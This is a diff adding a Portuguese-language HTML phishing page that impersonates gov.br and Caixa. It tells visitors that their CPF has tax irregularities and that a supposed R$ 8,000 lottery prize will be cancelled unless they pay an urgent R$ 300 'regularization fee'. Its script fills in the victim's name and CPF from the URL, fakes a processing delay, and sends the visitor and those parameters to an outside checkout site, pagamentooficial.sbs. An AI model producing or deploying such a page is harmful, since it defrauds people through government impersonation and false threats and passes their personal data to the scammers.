@@ -1,0 +1,131 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Regularização de CPF - gov.br</title>
+  <script>
+    localStorage.setItem("upsell", "up9")
+  </script>
+  <script src="https://cdn.tailwindcss.com"></script>
+<script>
+  tailwind.config = {
+    theme: {
+      extend: {
+        colors: {
+          'caixa-blue2': '#015CA9',
+          'caixa-light-blue2': '#049FD6'
+        }
+      }
+    }
+  }
+</script></head>
+
+
+<body class="bg-[#eef2f7] font-sans flex flex-col items-center min-h-screen">
+  <div class="w-full bg-gradient-to-r from-caixa-blue2 to-caixa-light-blue2 text-white px-4 py-2">
+    <div class="flex items-center">
+      <div class="size-10 rounded flex items-center justify-center mr-3">
+        <img src="images/tele.webp" alt="CAIXA" class="w-full">
+      </div>
+      <div>
+        <p class="text-sm font-medium" id="userName">Usuário</p>
+        <p class="text-sm font-medium" id="userDocument">000.000.000-00</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Etapa 1 -->
+  <div id="step1" class="w-[90%] max-w-[500px] bg-white p-4 rounded-xl shadow-lg text-center border border-[#d1d9e6] mt-[120px]">
+    <div class="bg-[#165DA9] p-4 rounded-t-xl text-white font-bold text-lg shadow-sm">
+      CPF em Análise - Risco de Bloqueio
+    </div>
+    <p class="mt-3">
+      ⚠️ Seu CPF apresenta <b>irregularidades fiscais</b> e pode ser <b>negativado</b> se não for regularizado.
+    </p>
+
+    <div class="bg-yellow-100 border-l-4 border-yellow-400 text-yellow-800 font-bold text-left text-sm px-4 py-3 mt-4 rounded">
+      📌 O não pagamento da taxa pode resultar em <b>bloqueio bancário, restrição de crédito e cancelamento de prêmios obtidos na Raspadinha Caixa</b>.
+    </div>
+
+    <button onclick="carregarAnalise()" class="w-full text-lg font-bold py-3 rounded bg-[#015ea2] text-white hover:bg-[#165DA9] mt-6">
+      🔎 Resolver Problema
+    </button>
+  </div>
+
+  <!-- Etapa 2 -->
+  <div id="step2" class="hidden w-[90%] max-w-[500px] bg-white p-6 rounded-xl shadow-lg text-center border border-[#d1d9e6] mt-[120px]">
+    <div class="bg-[#165DA9] p-4 rounded-t-xl text-white font-bold text-lg shadow-sm">
+      ⏳ Processando sua solicitação...
+    </div>
+    <p class="mt-3">Estamos verificando sua situação no sistema...</p>
+    <div class="loader mt-4"></div>
+  </div>
+
+  <!-- Etapa 3 -->
+  <div id="step3" class="hidden w-[90%] max-w-[500px] bg-white p-6 rounded-xl shadow-lg text-center border border-[#d1d9e6] mt-[120px]">
+    <div class="bg-[#b02a37] p-4 rounded-t-xl text-white font-bold text-lg shadow-sm">
+      ❌ CPF em Risco de Bloqueio Imediato!
+    </div>
+    <p class="mt-3">
+      🚨 Um <b>débito ativo</b> foi identificado em seu CPF. Caso não seja quitado, seu prêmio no valor de <b>R$ 8.000,00 será cancelado definitivamente</b>.
+    </p>
+
+    <div class="bg-red-100 text-red-800 font-bold text-left text-sm px-4 py-3 mt-4 rounded border-l-4 border-red-500 space-y-2">
+      <p>📌 <b>Motivo da Cobrança:</b> Regularização de pendências fiscais e taxa de validação obrigatória.</p>
+      <p>✅ <b>Evita ações judiciais e negativação do CPF</b></p>
+      <p>✅ <b>Libera sua conta para transações e créditos futuros</b></p>
+      <p>✅ <b>Garantia de conformidade com a Receita Federal</b></p>
+    </div>
+
+    <h5 class="text-2xl font-bold text-red-600 mt-4">
+      💰 Taxa de Regularização: <span class="text-[32px]">R$ 300,00</span>
+    </h5>
+    <p class="text-sm text-red-800 mt-1">(Pagamento imediato para evitar restrições financeiras.)</p>
+
+    <button onclick="redirect(event)" class="w-full text-lg font-bold py-3 rounded bg-[#015ea2] text-white hover:bg-[#165DA9] mt-6">
+      REGULARIZAR AGORA
+    </button>
+  </div>
+
+  <script>
+    function formatCPF(cpf) {
+      cpf = cpf.replace(/\D/g, '');
+      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+
+    function getUrlParams() {
+      const urlParams = new URLSearchParams(window.location.search);
+      return {
+        name: urlParams.get('name') || 'Usuário',
+        document: urlParams.get('document') || '00000000000'
+      };
+    }
+
+    function updateUserData() {
+      const params = getUrlParams();
+      const formattedCPF = formatCPF(params.document);
+      document.getElementById('userName').textContent = params.name;
+      document.getElementById('userDocument').textContent = formattedCPF;
+    }
+
+    function redirect(event) {
+      event.preventDefault()
+      var currentUrlParams = window.location.search
+      window.location.href = "https://pagamentooficial.sbs/checkout/up-8/" + currentUrlParams
+    }
+
+    function carregarAnalise() {
+      document.getElementById("step1").classList.add("hidden")
+      document.getElementById("step2").classList.remove("hidden")
+      setTimeout(() => {
+        document.getElementById("step2").classList.add("hidden")
+        document.getElementById("step3").classList.remove("hidden")
+      }, 3000)
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+      updateUserData();
+    });
+  </script>
+
+
+</body></html>
